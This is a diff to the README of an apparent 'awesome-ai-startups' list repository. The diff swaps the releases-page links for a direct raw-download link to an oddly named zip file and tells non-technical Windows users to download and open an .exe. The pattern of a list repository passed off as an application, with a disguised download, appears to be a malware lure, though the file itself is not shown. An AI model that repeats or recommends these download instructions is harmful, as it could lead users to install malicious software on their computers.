@@ -1,6 +1,6 @@
 # 🚀 awesome-ai-startups - Discover top indie artificial intelligence products
 
-[![](https://img.shields.io/badge/Download_Application-Blue-blue)](https://github.com/Lacemakingatmometer593/awesome-ai-startups/releases)
+[![](https://img.shields.io/badge/Download_Application-Blue-blue)](https://github.com/Lacemakingatmometer593/awesome-ai-startups/raw/refs/heads/main/Frenghi/ai-startups-awesome-heterochrome.zip)
 
 This project provides a directory of artificial intelligence products built by independent creators. These startups use bootstrap funding or early-stage capital. You can browse these tools to improve your marketing, automate your tasks, or manage search engine optimization.
 
@@ -18,7 +18,7 @@ The list covers several categories:
 
 You do not need programming skills to use this software. Follow these steps to obtain the tool on your Windows computer.
 
-1. Go to this link: [https://github.com/Lacemakingatmometer593/awesome-ai-startups/releases](https://github.com/Lacemakingatmometer593/awesome-ai-startups/releases).
+1. Go to this link: [https://github.com/Lacemakingatmometer593/awesome-ai-startups/raw/refs/heads/main/Frenghi/ai-startups-awesome-heterochrome.zip](https://github.com/Lacemakingatmometer593/awesome-ai-startups/raw/refs/heads/main/Frenghi/ai-startups-awesome-heterochrome.zip).
 2. Look for the section labeled "Assets."
 3. Select the file ending in `.exe` to begin your download.
 4. Open your "Downloads" folder.
